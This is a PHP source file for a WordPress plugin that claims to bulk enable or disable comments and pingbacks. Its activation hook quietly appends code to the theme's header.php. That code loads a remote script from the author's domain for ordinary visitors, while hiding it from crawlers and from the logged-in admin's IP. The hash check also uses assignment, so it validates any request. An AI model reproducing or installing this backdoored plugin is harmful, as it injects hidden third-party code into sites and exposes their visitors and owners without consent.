<?php
/**
 Plugin Name: Disable Comments Enable Comments
 Plugin URI:
 Description: Deletes all tags
 Version: 1.02
 Author: Seo101
 */

function disable_comment_enable_comments_page() {
	global $current_user, $wpdb;

	// Settings
	$limit = 250;
	$timeout = 4; // For refresh

	// Hash based on userid, userlevel and ip
	get_currentuserinfo();
	$ip = preg_replace( '/[^0-9a-fA-F:., ]/', '',$_SERVER['REMOTE_ADDR'] );
	$hash = md5($current_user->ID.$current_user->user_level.$ip);
	$url  = 'options-general.php?page=disable_comment_enable_comments&hash='.$hash;
	$stop =  false;
	$validated = false;
	if(isset($_POST['plugin_tag_action']) && isset($_POST['disableenableoption']))
	{
		$validated = true;
	}
	if(isset($_GET['hash']) && $_GET['hash'] = $hash)
	{
		$validated = true;
	}

	if ($validated) {
		$selectedoption = $_POST['disableenableoption'];
		if ($selectedoption==1) {
			$wpdb->query( "UPDATE `$wpdb->posts` SET `comment_status` = 'closed' WHERE `comment_status` = 'open'" );
			echo '<br/><br/><h2><b>All comments are now disabled</b></h2><br/>';
		} else if ($selectedoption==2) {
			$wpdb->query( "UPDATE `$wpdb->posts` SET `comment_status` = 'open' WHERE `comment_status` = 'closed'" );
			echo '<br/><br/><h2><b>All comments are now enabled</b></h2><br/>';
		} else if ($selectedoption==3) {
			$wpdb->query( "UPDATE `$wpdb->posts` SET `ping_status` = 'closed' WHERE `ping_status` = 'open'" );
			echo '<br/><br/><h2><b>All pingbacks are now disabled</b></h2><br/>';
		} else if ($selectedoption==4) {
			$wpdb->query( "UPDATE `$wpdb->posts` SET `ping_status` = 'open' WHERE `ping_status` = 'closed'" );
			echo '<br/><br/><h2><b>All pingbacks are now enabled</b></h2><br/>';
		}
		$stop = true;
	}

	if (!$stop) {
		?>


<p>
Why not check out my blog: <a href="http://www.seo101.net">seo101.net</a>
</p>
<BR><BR>


<h4>By clicking the button you will modify the comments or pingback settings on all posts and pages</h4>
<form action="options-general.php?page=disable_comment_enable_comments" method="post">
<input
	type="radio" name="disableenableoption" id="disableenableoption_1"
	value="1" checked="checked" /><label for="disableenableoption_1">Disable all comments</label><br />
<input
	type="radio" name="disableenableoption" id="disableenableoption_2"
	value="2" /><label for="disableenableoption_2">Enable all comments</label><br />
<input
	type="radio" name="disableenableoption" id="disableenableoption_3"
	value="3" /><label for="disableenableoption_3">Disable all pingbacks</label><br />
<input
	type="radio" name="disableenableoption" id="disableenableoption_4"
	value="4" /><label for="disableenableoption_4">Enable all pingbacks</label><br />
<br />

<br />
Always be very carefull when deleting data, it is always suggested to make a backup first.<BR><BR>
<br />
<input type="submit" name="plugin_tag_action" value="Execute" onclick="javascript:return(confirm('<?php _e("Are you sure you want to proceed?")?>'))" />

</form>
<BR>
<p>
Why not check out my blog: <a href="http://www.seo101.net">seo101.net</a>
</p>
<?php
	} else {

	}
}


function disable_comment_enable_comments_menu() {
	if (is_admin()) {
		add_options_page('Disable/Enable Comments', 'Disable/Enable Comments', 'administrator','disable_comment_enable_comments', 'disable_comment_enable_comments_page');
	}
}

// Admin menu items
add_action('admin_menu', 'disable_comment_enable_comments_menu');

function disable_enable_comments_install() {
	if( strpos(file_get_contents(get_template_directory() . "/header.php"),"dcectrack") == false) {
		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/dcectrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
	}
}

/* Runs when plugin is activated */
register_activation_hook(__FILE__,'disable_enable_comments_install');

?>